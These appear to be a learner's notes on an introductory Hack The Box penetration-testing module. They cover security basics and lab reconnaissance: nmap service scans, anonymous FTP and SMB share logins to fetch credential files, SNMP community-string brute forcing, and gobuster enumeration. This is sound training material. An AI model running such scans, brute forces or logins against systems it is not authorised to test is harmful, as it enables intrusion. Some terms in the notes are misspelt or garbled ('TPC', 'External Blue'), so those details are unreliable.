Reference: https://academy.hackthebox.com/module/details/77
# Info-sec Overview

Cyber Security, or **Information Security** (infosec) has multiple domains, some but not all include:
- Network and infrastructure security 
- Application security 
- Security testing 
- Systems auditing 
- Business continuity planning 
- Digital forensics 
- Incident detection and response 

**Info-sec**: The practice of protecting data from unauthorized access, changes, unlawful use, disruption, and more. 
- Info-sec professionals may also try to reduce impact of these incidents

**Data**: Physical or electronic knowledge. 

**CIA Triad**: Protecting the *"confidentiality, integrity, and availability of data"*

---
## Risk Management Process
Data must be protected in a efficient way, this is done using the *risk management process*

| Step                 | Explanation                                                                                                                                                                                  |
| -------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Identifying the Risk | Identifying risks the business is exposed to, such as legal, environmental, market, regulatory, etc...                                                                                       |
| Analyze the Risk     | Analyzing the risks to determine their impact and probability. The risks should be mapped to the organization's various policies, procedures, and business processes                         |
| Evaluate the Risk    | Evaluating, ranking, and prioritizing risks. Then, the organization must decide to **accept** (unavoidable), **avoid** (change plans), **control** (mitigate), or **transfer** risk (insure) |
| Dealing with Risk    | Eliminating or containing the risks as best as possible. This is handled by interfacing directly with the stakeholders for the system or process that the risk is associated with            |
| Monitoring Risk      | All risks must be constantly monitored. Risks should be constantly monitored for any situational changes that could change their impact score. (low, medium, high)                           |

---
## Red Team vs. Blue Team

Red is offensive and blue is defensive

Red
- Pen testing 
- Pretends to be a adversary 
- find weaknesses in a business
- social engineering 

Blue 
- defense 
- most jobs
- sys admin
- coming up with policies 
- responding to threats 
- updating machines
---
## Role of Penetration Testers 
**Possible roles** 
- Security Assessor 
- Network penetration tester 
- web application penetration tester 
- red teamer
**What do they do**
- Helps an organization identify risks in ts external and internal networks. May include:
	- network 
	- web
	- sensitive data exposure
	- configs
	- issues that could lead to the companies reputation being harmed
**What pentesters identify**
- Risks to a organization
- Provide information on how to reproduce these risks 
- Give advice on either mitigating or remediating the issues identified

# Getting Started with a Pen-test Distro
As a pen tester, you will attempting to break into many types of machines, you must try to be as prepared as possible. One of the best ways to practice is by using VMs. This gives you the ability to open up a virtual machine on your actual machine, on Linux, windows, or more.
## Choosing a Distro
Many types of Linux distributions (distros) for pen testing. 
- Specialize in specific areas 
- Can customize 
- Debian is known for pen testing 
- Ubuntu is another good option
- HTB will be using **Parrot OS**
- Suggested to do pen tests on fresh VMs to avoid conflicts from previous events 

## Setting Up a Pen-test Distro
### Ways of setting up local pen-testing distros
- install as base OS (not recommended)
- dual boot (takes long time)
- Install using virtualization (**Recommended**)

### Virtualization Options
- Hyper-V on Windows 
- Proxmox or VMware 
- Virtual Box 
- VMware Workstation layer
- VMware Workstation (paid)

### What is a Hypervisor
**Hypervisor**: A software that allows us to create and run virtual machines (VMs).
- enable us to use our host computer to run multiple VMs by virtually sharing memory and processing resource
- Runs isolated from the primary Operating System (OS)
- The more RAM, the more VMs you can run

## ISO
**ISO**: An ISO file is a CD-ROM that can be mounted within our hypervisor of choice to build the VM by installing the operating system ourselves.

## OVA 
**OVA**: The OVA file is a pre-built virtual appliance that contains an **OVF** XML file that specifies the VM hardware settings and a **VMDK**, which is the virtual disk that the operating system is install on. and **OVA** is pre-built and therefore can be rapidly deployed to get up and running quicker.

## Practicing with Parrot 
Parrot OS is the linux distro that will be used for HTB. You should be able to use other distros for non-specific projects.

# Staying Organized 
It important to organize your notes, files, and any other documentation you have for future use.

## Folder Structure 
When attacking a single box, lab, or client environment, we should have a **clear folder structure on our attack machine**, such as:
- scoping information
- enumeration data 
- evidence of exploitation attempts
- sensitive data such as credentials
- other data obtained during recon, exploitation, and post-exploitation.
*Example Folder Structure*
![[Pasted image 20240925131040.png]]**Client**: Acme Company 
They have two different assessments going on:
- **IPT**: Internal Penetration Test 
- **EPT**: External Penetration Test
Under each folder, there are folders for saving different types of data:
- scan data 
- any relevant tools
- logging output
- scoping information 
	- list of IPs
	- networks to feed to our scanning tools
- Evidence: containing any proof of them finding sensitive information 

**Other options**:
- creating a folder for each target host and saving screenshots within
- Organize their notes by host or network and save screenshots directly into the note taking tool
- Experiment with folder structures and see what work best for you to stay organized and work most efficiently


## Note Taking Tools
Be sure to find a note taking app you like. You need something that keeps things organized like:
- Cherry tree
- Obsidian 
- Google docs 
- Gitbook
- Visual Studio
- Evernote 
- Notion
- Sublime Text
- Notepad++

## Other Tools and Tips
- Take notes on everything you learn, it may be useful in future use.
- Make cheat sheets 
- Make checklists 
- Report templates for different assessment types 
- build a findings/vulnerability database
	- Spreadsheet 
	- Can be more complex

## Moving On
Try out different things and pick one you like


# Connecting Using VPN
**Virtual Private Network (VPN)**: Allows you to connect to a private (internal) network and access hosts and resources as if you were directly to the target private network
- Secured communications over shared public networks 
- Private network

### How VPN Works
Routes our connecting devices internet connection through the targets VPN's private server instead of our internet service provider (ISP)
- Data originates from the VPN server
- Your IP address changes 

### Types of VPNs
Two main types of remote access VPNs:
1. **Client-based VPN**
	- Requires use of client-based software to establish the VPN connection
	- Once connected it works as if the computer is connected directly to the target VPN
1. **SSL VPN**
	- Uses the web browser as the VPN client
	- Connection established between browser and SSL VPN
	- Only configured to access web-based applications without needing to install it

## Why Use A VPN?
Can be used for many reasons, some include:
- Connect to a VPN server in another country to obscure your browsing traffic or disguise your public IP address
- Increase level of security and privacy 
- Usage of a VPN **does not** guarantee anonymity, but can be useful to bypass certain network/firewall restrictions 

## Connecting to HTB VPN
HTB created weak machines for people to test. It requires them to connect to the target network via VPN in order to access it. You cannot connect from outside the internet. 
**Important Notes to Keep in Mind**
- Always consider the network to be "hostile"
- Only connect from a virtual machine 
- Disallow password authentication if SSH is enabled on our attacking VM

### Connecting to a VPN
`sudo openvpn user.ovpn` 
- `sudo`: elevated privileges, must have password
- `openvpn`: The vpn service we are trying to connect to
- `user.ovpn`: The vpn "profile" file that is used to connect to vpn
![[Pasted image 20240925140615.png]]

`ifconfig`: Check your ip address
![[Pasted image 20240925140655.png]]
IP: 10.10.x.2

`netstat -rn`: shows the networks accessible via the VPN
![[Pasted image 20240925140711.png]]

# Common Terms 
Pen Testing is complex and will have a lot of vocabulary all over the place. Here are the most common

## What is a Shell?
**Shell:** A program that takes input from the user via the keyboard and passes these commands to the operating system to preform a specific function.
- When computers were first created, the only thing that was available was the Shell.
- Now we have things called graphic user interfaces (GUIs), which provide graphics like what you are using right now

### Bash (Bourne Again Shell)
Most linux systems use a program called **Bash (Bourne Again Shell)**, a shell program to interact with the operating system.  

**Bash**: An enhanced version of **sh**, the Unix systems' origin shell program

Other Shells
- Zsh
- Tcsh
- Ksh
- Fish shell
- etc...

"Getting a shell" on a box(system) means the target host has been exploited. It can happen by:
- Exploiting a web application 
- Finding a network/service vulnerability 
- obtaining credentials           

### Types of Shell Connections


| Shell Type    | Description                                                                                                                                   |
| ------------- | --------------------------------------------------------------------------------------------------------------------------------------------- |
| Reverse Shell | Initiate a connection back to a "listener" on our attack box                                                                                  |
| Bind Shell    | "Binds" to a specific port on the target host and waits for a connection from our attack box                                                  |
| Web Shell     | Runs operating system commands via the web browser typically not interactive or semi-interactive. It can also be used to run single commands. |

*Different Shells have different uses at different times. The program to get access to the Shell can be written in many languages.*

## What is a Port?
Ports can be thought of as a window or door on a house. (House is a remote system). 
- If a window or door is left open, anyone can get unauthorized access to a home.
**Ports**: Virtual points where network connections begin and end. 
- Software-based 
- managed by the host operating system 
- specified process or service and allows computer to different traffic types. (SSH Traffic flows to a different port than Web traffic)

### Port Numbers
Ports are assigned numbers, and there are many standardized across all network-connected devices. (though a service can be configured to run on a non-standard port)
- HTTP messages (website traffic) typically go to port 80, while HTTPS goes to 443.
- Allows us to access specific services or applications running on target devices. 
- Ports help computers understand how to handle the various types of data they receive

### TPC and UDP
There are two categories of ports, **Transmission Control Protocol** (TCP), and **User Datagram Protocol** (UDP).

**TCP**
- Connection-oriented (connection must be established before data can be sent)
- Server must be in a listening state awaiting connection requests from clients
**UDP**
- Utilizes a connection-less communication model
- No "handshake" and therefore introduces a certain amount of reliability since there is no guarantee of data delivery

### UDP vs. TCP


| UDP                                                                                                                      | TCP                                     |
| ------------------------------------------------------------------------------------------------------------------------ | --------------------------------------- |
| Useful when error correction/checking is either not needed or is handled by the application itself                       |                                         |
| Useful for time-sensitive tasks since dropping packets is faster than waiting for delayed packets due to retransimission | Significantly affect a real-time system |
There are **65,535** TPC ports and 65,535 different UDP ports, each denoted by a number.

### Well-known TPC & UDP Ports


| Port(s)     | Protocol       |
| ----------- | -------------- |
| 20/21 (TCP) | FTP            |
| 22 (TCP)    | SSH            |
| 23 (TCP)    | Telnet         |
| 25          | SMTP           |
| 80          | HTTP           |
| 161         | SNMP           |
| 389         | LDAP           |
| 443         | SSL/TLS(HTTPS) |
| 445         | SMB            |
| 3389        | RDP            |
*It is very important that you learn the ports by memorization. It will take time, but it will be worth it.*

## What is a Web Server
**Web Server**: An application that runs on the back-end server, which handles all HTTP traffic from the client-side browser, routes it to the requests destination pages, and finally responds to the client-side browser.
 
**Common Ports**: 80(HTTP) or 443(HTTPS)
- Connects end-users to various parts of the web application and handles their various responses

### Web Servers Attack Surface
Web servers usually are open for the public, and so if they have any vulnerabilities, they may get their back-end server compromised. 
- Vast attack surface 
- High-value target
- [OWASP](https://owasp.org/www-project-top-ten/)

### Web Top Vulnerabilities

| Category                                   | Description                                                                                                                                                                                                                                                                                                          |
| ------------------------------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Broken Access Control                      | Restrictions are not appropriately implemented to prevent users accounts, viewing sensitive data, accessing unauthorized functionality, modifying data, etc...                                                                                                                                                       |
| Cryptographic Failures                     | Failures related to cryptography which often leads to sensitive data exposure or system compromise                                                                                                                                                                                                                   |
| Injection                                  | User-supplied data is not validated, filtered, or sanitized by the application. Examples: SQL injection, command injection, LDAP injection, etc...                                                                                                                                                                   |
| Insecure Design                            | These issues happen when the application is not designed with security in mind                                                                                                                                                                                                                                       |
| Security Misconfiguration                  | missing appropriate security hardening across any part of the application stack, insecure default configs, open cloud storage, verbose error messages which disclose too much information                                                                                                                            |
| Vulnerable and Outdated Components         | Using components (both client-side and server-side) that are vulnerable, unsupported, or out of date                                                                                                                                                                                                                 |
| Identification and Authentication Failures | Authentication-related attacks that target users identify, authentication, and session management                                                                                                                                                                                                                    |
| Software and Data Integrity Failures       | Software and data integrity failures relate to code and infrastructure that does not protect against integrity violations. Example: Application plugins, libraries, modules form untrusted sources, repos, and content delivery networks (CDNs)                                                                      |
| Security Logging and Monitoring Faliures   | Help detect, escalate, and respond to active breaches. Without logging and monitoring, breaches cannot be detected                                                                                                                                                                                                   |
| Server-Side Request Forgery                | SSRF flaws occur whenever a web application is fetching a remote resource without validating the user-supplied URL. Alloiws an attack to coerce the application to send a crafted request to an unexspected destination even when protected by a firewall, VPN, or another type of network access control list (ACL) |

*It is important to learn of the different web vulnerabilities*

# Basic Tools

There are many tools that need to be learned to be a proper penetration tester. Some of these include:
- SSH
- Netcat
- Tmux
- Vim

## Using SSH
**Secure Shell (SSH)** is a network protocol that runs on port **22** by default and provides users such as system administrators a *secure way to access a computer remotely*.
- Can be configured with password authentication, or password less using a **public-key** authentication using a **SSH public/private key pair**.
- Can be used to remotely access systems on the same/different network, facilitate connections to resources in other networks using port forwarding/proxying, and upload/down files

### SSH: Client-Server model
To connect, you use an SSH client like **OpenSSH** to an SSH server. 
- Possible attack scenario: You get the private key for a machine and can now SSH into their machine
- Connect **more stable** than a reverse shell connect, and can be used as a "jump host" to enumerate and attack other hosts in a network, transfer tools, set up persistence, etc...
## Connecting with SSH
```
ssh Bob@10.10.10.10
```
- **ssh**: Use the ssh command when you want too 
- **Bob**: The username you are trying to connect to on the other device
- **@** Separate the username and the IP
- **10.10.10.10**: The IP address you are trying to connect to

## Using Netcat
**Netcat, ncat** or **nc**, is a network tool used for interacting with TPC/UDP ports. It is **primary used for connecting to shells.** It can also be used to:
- Connect to any listening port and interact with the service running on that port
	- SSH is programming to handle connections over port 22 to send all data and keys, we can connect to TPC port 22 with **netcat**:
```
netcat 10.10.10.10 22
```
- **netcat**: The program you are trying to run
- **10.10.10.10**: The IP you are trying to connect to
- **22**: The specific port you are looking for
**Output:**
```
shell-session SSH-2.0-OpenSSH_8.4p1 Debian-3
```
- As seen above, the port 22 sent a message stating what service is running on it, in this case, **Open SSH**. 
- This technique is called **Banner Grabbing**, helpful for quickly identifying what service is running on a particular port.
- Can transfer files between machines.

**Netcat** comes pre-installed in most Linux distros, and can be downloaded on windows. There is also a Windows alternative called **PowerCat**. 

### Socat
A similar network utility is called **socat**, containing a few features **netcat** does not support 
- Forwarding ports 
- Connecting to serial devices 
- **Upgrade a shell to a fully interactive TTY**
- Very useful in pentesting

## Using Tmux
**Tmux** is a terminal multiplexer. It is very useful for expanding a Linux terminal's features. Examples:
- Multiple windows

**Installing tmux**:
```
sudo apt install tmux -y
```
- **sudo** for elevated access
- **apt** for package manager
- **install** for install programs
- **tmux** name of package 
- **-y** for confirming the download

### tmux window
To open **tmux**, just type tmux in the command line.
tmux has **commands** you can use, they will start with **CTRL + B** and then some input, like:
- **C**: Opens a new window
	- You can see the numbered window on the bottom, to switch to different windows
- **#**: Select the number of the window you want to switch to
- **SHIFT + %**: Split window horizontally
- **SHIFT + "**: Split window vertically
- **left/right/up/down arrows**: Switch to different windows

## Using Vim
**Vim** is a very useful text editor for writing code or editing text files. One of the best reasons for using it is it relies **entirely on the keyboard**, so it increases your speed not using a mouse. There are specific keys you must enter, there are many, but here are some examples:
- **"I"**: Insert, this is the "edit" mode that lets you add/remove text
- "**esc**": Gets out of Inset mode, and back to **normal mode** or read-only mode
- **"x"**: Cut a single character
- **"dw"**: Cut a single word
- **"dd"**: Cut a full line
- **"yw"**: Copy a word
- **"yy"**: Copy a full line
- **"p"**: Paste
- **":w (file name)"**: Save a file with a name, if the file name is already set, you can save/quit with **:wq**
- **":q"**: Exit file, add !(:q!) to exit without saving
- **":#"**: Go to line number #
**Tip**: #(command) multiplies a command # number of times. Ex: **"4yw"** runs yw 4 times 

# Service Scanning 

## Entering our first machine

Now it is time to start exploring a machine. Some things you must identify:
- The operating system
- Available services that might be running
- Machines that specialize in specific services are called **servers** while non-specific machines tend to be called **workstations**
**Goal**: Instead of performing the actions expected as part of the service, we are interested to see if we can **coerce the service into performing some unintended action that supports our objects**, such as, executing a command of our choosing.

### Connecting to a service
A computers have an **IP address**, and all the services they run use a **port number**. To access what we want, we will need to get both of these numbers. It would take forever to manually exam all 65,535 ports, so we will be using a special method. One of the best ways to start working on this is by using a network mapping tool called **Nmap**

### Scanning with Nmap
We will be starting with a basic scan. When using **Nmap**, you can call the command, followed by an IP, to find the open ports like seen below:
```Input
nmap 10.129.42.253
```
```Output
Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:07 EST
Nmap scan report for 10.129.42.253
Host is up (0.11s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 2.19 seconds
```
*As seen above, we can see what ports are shown (TPC/UDP), what state they are in, and what service they are running. At times you may get more or less, information, so you must learn how to use Nmap to its best ability* 
**States**:
- Open: The port is open to the public
- Closed: No one can access the port 
- Filtered: Closed or unknown (Can happen when being blocked with a firewall)
**Common Ports and Their Respective Machine** :
- 22: SSH (Linux)
- 80: HTTP
- 3389: Report Desktop Services (Windows Machine)

### Nmap Arguments
When running commands, you can add **arguments** that modify it, allowing you to make it work in different situations. Some include:
- -sC: Try and obtain more detailed information
- -sV: Version scan, find what services are running on the target system. (protocol, application name, and version)
- -p-: Scan **all** 65,535 TPC ports. (This may take a while)
```Input
nmap -sV -sC -p- 10.129.42.252
```
```Output
Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:18 EST
Nmap scan report for 10.129.42.253
Host is up (0.11s latency).
Not shown: 65530 closed ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Feb 25 19:25 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: PHP 7.4.3 - phpinfo()
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: GS-SVCSCAN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-25T21:21:51
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 233.68 seconds
```
*Some things to keep in mind*:
- **Version** section adding, giving the service version, and the operating system if possible.
	- Above shows this is a Linux(Ubuntu) machine
- It took **much longer** when scanning all the ports, but a lot more information was found

### Nmap Scripts 
When running the **-sC** argument, it will run multiple default scripts against the target. You can also run specific scripts if needed. Example:
- For a Citrix company, you may want to run Citrix specific scripts. 
To find scripts relates to specific companies, you can look in the `scripts/` directory in Nmap using the **locate** command. 
```Input
locate scripts/citrix
```
```Output
/usr/share/nmap/scripts/citrix-brute-xml.nse
/usr/share/nmap/scripts/citrix-enum-apps-xml.nse
/usr/share/nmap/scripts/citrix-enum-apps.nse
/usr/share/nmap/scripts/citrix-enum-servers-xml.nse
/usr/share/nmap/scripts/citrix-enum-servers.nse
```
*As you can see, there are multiple scripts for Citrix, that relate to different domains.*

The format for running a Nmap script is:
`nmap --script <script name> -port<port> <host>`
- Scripts enhance scans' functionality and help greatly

## Attacking Network Services 
Now we will look at multiple ways of attack services

### Banner Grabbing 
**Banner Grabbing** is very useful when trying to figure out what kind of service is running, in a short amount of time.
*This can be done using nmap by using the format:*
`nmap -sV --script=banner <target>`
*You can also use Netcat or nc:*
```Input
nc -nv 10.129.42.253 21
```
```Output
(UNKNOWN) [10.129.42.253] 21 (ftp) open
220 (vsFTPd 3.0.3)
```
*We now know the target is running a FTP server on port 21, with the version 3.0.3*
*Nmap Version of code above:*
`nmap -sV --script=banner -p21 10.10.10.0/24`

## FTP
**File Transfer Protocol (FTP)** is a standard protocol that should be learned by everyone. Some information from the Nmap scan below shows the version, and that anonymous authentication is enabled, and that a **pub** directory is available
```Input
nmap -sC -sV -p21 10.129.42.253
```
```Output
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-20 00:54 GMT
Nmap scan report for 10.129.42.253
Host is up (0.081s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 ftp      ftp          4096 Dec 19 23:50 pub
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.2
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
Service Info: OS: Unix

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.78 seconds
```

### Connecting to FTP
Lets try to connect to the service using the **ftp** command-line utility 
```Input
ftp -p 10.129.42.253
```
```shell-session
Connected to 10.129.42.253.
220 (vsFTPd 3.0.3)
Name (10.129.42.253:user): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls
227 Entering Passive Mode (10,129,42,253,158,60).
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Feb 25 19:25 pub
226 Directory send OK.

ftp> cd pub
250 Directory successfully changed.

ftp> ls
227 Entering Passive Mode (10,129,42,253,182,129).
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            18 Feb 25 19:25 login.txt
226 Directory send OK.

ftp> get login.txt
local: login.txt remote: login.txt
227 Entering Passive Mode (10,129,42,253,181,53).
150 Opening BINARY mode data connection for login.txt (18 bytes).
226 Transfer complete.
18 bytes received in 0.00 secs (165.8314 kB/s)

ftp> exit
221 Goodbye.
```
**Notes on above**:
- First the user logged in using the **anonymous** option, since the nmap scan showed it was allowed
- They then used **ls** to show the files available, and saw there was a **pub** directory, they travelled into it using **cd** and saw a `login.txt` file
- They then used the **get** command to download the file to their local computer
- They logged out with **exit**
- Once back on their machine, they looked at the contents of the file and saw the credentials of the admin account

## SMB
**Server Message Block (SMB)** is a popular protocol on Windows machines that provide many **vectors (Methods)** for **vertical and lateral movement (The ability to get access to computers and travel on them to get even more access)** Some examples include:
- Sensitive data 
- credentials 
- network file shares 
- vulnerable to RCE exploits such as [External Blue](https://www.avast.com/c-eternalblue)

Nmap has many scripts for SMB as well, such as [smb-os-discovery.nse](https://nmap.org/nsedoc/scripts/smb-os-discovery.html), that interacts with the **SMB** service to extract the reported operating system version.
```Input
nmap --script smb-os-discovery.nse -p445 10.10.10.40
```
```Outout
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-27 00:59 GMT
Nmap scan report for doctors.htb (10.10.10.40)
Host is up (0.022s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: CEO-PC
|   NetBIOS computer name: CEO-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-12-27T00:59:46+00:00

Nmap done: 1 IP address (1 host up) scanned in 2.71 seconds
```
**Things learned**
- The target is running Windows 7
- It might be vulnerable to the Eternal Blue exploit 
To learn more, we will run the **-A** argument that gets much more information on the port
```Input
nmap -A -p445 10.129.42.253
```
```Output
Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-25 16:29 EST
Nmap scan report for 10.129.42.253
Host is up (0.11s latency).

PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 4.6.2
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 2.6.32 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

Host script results:
|_nbstat: NetBIOS name: GS-SVCSCAN, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-02-25T21:30:06
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   111.62 ms 10.10.14.1
2   111.89 ms 10.129.42.253

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.72 seconds
```
**Information Gathered**:
- Runs a Linux Kernel, Samba version 4.6.2
- Hostname is GS-SVCSCAN

## Shares

**SMB** allows users and admins to share folders and make them accessible remotely by other users. These shares have files that may contain:
- Sensitive information
- passwords 
- etc...
To interact with SMB, we can use **smbclient**, and add the **-L** flag(argument) to retrieve a list of available shares on the remote host, and **-N** suppresses the password prompt.
```Input
smbclient -N -L \\\\10.129.42.253
```
```Output
	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	users           Disk      
	IPC$            IPC       IPC Service (gs-svcscan server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```
**Information Gathered**
- A non-default share called **users**
We will try to connect as a guest user
```Input
smbclient \\\\10.129.42.253\\users
```
```Output
Enter WORKGROUP\users's password: 
Try "help" to get a list of possible commands.

smb: \> ls
NT_STATUS_ACCESS_DENIED listing \*

smb: \> exit
```
**Information Gathered**
- The guest does not have permission
**Now lets try using the user bob (bob:Welcome1)**
```Input
smbclient -U bob \\\\10.129.42.253\\users
```
```Output
Enter WORKGROUP\bob's password: 
Try "help" to get a list of possible commands.

smb: \> ls
  .                                   D        0  Thu Feb 25 16:42:23 2021
  ..                                  D        0  Thu Feb 25 15:05:31 2021
  bob                                 D        0  Thu Feb 25 16:42:23 2021

		4062912 blocks of size 1024. 1332480 blocks available
		
smb: \> cd bob

smb: \bob\> ls
  .                                   D        0  Thu Feb 25 16:42:23 2021
  ..                                  D        0  Thu Feb 25 16:42:23 2021
  passwords.txt                       N      156  Thu Feb 25 16:42:23 2021

		4062912 blocks of size 1024. 1332480 blocks available
		
smb: \bob\> get passwords.txt 
getting file \bob\passwords.txt of size 156 as passwords.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
```
**Information Gathered**
- Login for bob worked
- bob has permission to view files 
- we gained access to the password file
- we used **get** to download the file

## SNMP
**SNMP Community strings** provide information and statistics about a router or device, which can help in gaining access to it. 
**Public:**
```Input
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
```
```Output
iso.3.6.1.2.1.1.5.0 = STRING: "gs-svcscan"
```
**Private:**
```Input
snmpwalk -v 2c -c private  10.129.42.253 
```
```Output
Timeout: No Response from 10.129.42.253
```

You can use a tool called **onesixtyone** to brute force community string names by using a dictionary file of common community strings such as the `dict.txt` file contained in the github.
```Input
onesixtyone -c dict.txt 10.129.42.254
```
```Output
Scanning 1 hosts, 51 communities
10.129.42.254 [public] Linux gs-svcscan 5.4.0-66-generic #74-Ubuntu SMP Wed Jan 27 22:54:38 UTC 2021 x86_64
```

## Practice Scenario
Based on what you learned, try to get into the system.
**Target System:** 10.129.16.10

*Perform an Nmap scan of the target. What does Nmap display as the version of the service running on port 8080?*
```
nmap -sV -p8080 10.129.16.10
```
- Look for the **service** tab
*Perform an Nmap scan of the target and identify the non-default port that the telnet service is running on.*
```
nmap -sV 10.129.16.10
```
- Look for the **port** tab
*List the SMB shares available on the target host. Connect to the available share as the bob user. Once connected, access the folder called 'flag' and submit the contents of the flag.txt file.*
```
smbclient -U bob \\\\10.129.42.253\\users
```
- Find flag with **ls and cd**
- Download using **get**

# Web Enumeration
Web services sometimes are the only point of attack on very secure servers. We will learn about the possible tools you can use to improve your pen testing.

## Gobuster
To find hidden files or directories, use **ffuf** or **GoBuster**. This can help us find pages containing sensitive data to access the web server.

### Directory/File Enumeration
**Gobuster** can be used for plenty of other things as well, including: DNS, vhost, directory brute-forcing, and more. We will focus on directory (and file) brute-forcing modes using the switch **dir**. 
```Input
gobuster dir -u http://10.10.10.121/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
```Output
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.121/
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/11 21:47:25 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/index.php (Status: 200)
/server-status (Status: 403)
/wordpress (Status: 301)
===============================================================
2020/12/11 21:47:46 Finished
===============================================================
```
**HTTP Codes:**
- 200s: SUCCESS
- 300s: REDIRECT
- 400s: ACCESS DENIED
Above showed we have access to /index.php, so we will use it to gain some access

### DNS Subdomain Enumeration 
Subdomains can be important as they may host important resources like admin panels or applications. **GoBuster** can be used to find available subdomains using the **dns** flag.
**Cloning the SecLists Github for useful lists for fuzzing/exploitation**
```shell-session
git clone https://github.com/danielmiessler/SecLists
```
```shell-session
sudo apt install seclists -y
```
**Following Steps**:
- Add a DNS Server, using 1.1.1.1 to **/etc/resolv.conf** file. 
- The goal is to target the domain **inlanefreight.com**
```Input
gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt
```
```Output
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Domain:     inlanefreight.com
[+] Threads:    10
[+] Timeout:    1s
[+] Wordlist:   /usr/share/SecLists/Discovery/DNS/namelist.txt
===============================================================
2020/12/17 23:08:55 Starting gobuster
===============================================================
Found: blog.inlanefreight.com
Found: customer.inlanefreight.com
Found: my.inlanefreight.com
Found: ns1.inlanefreight.com
Found: ns2.inlanefreight.com
Found: ns3.inlanefreight.com
===============================================================
2020/12/17 23:10:34 Finished
===============================================================
```

## Web Enumeration Tips 
Tips to better pen test web apps 

### Banner Grabbing / Web Server Headers
Getting web server headers is great for finding out the kinds of servers a machine may be running. A great to get this header is by using the cURL commnad. 
```Input
curl -IL https://www.inlanefreight.com
```
```Output
HTTP/1.1 200 OK
Date: Fri, 18 Dec 2020 22:24:05 GMT
Server: Apache/2.4.29 (Ubuntu)
Link: <https://www.inlanefreight.com/index.php/wp-json/>; rel="https://api.w.org/"
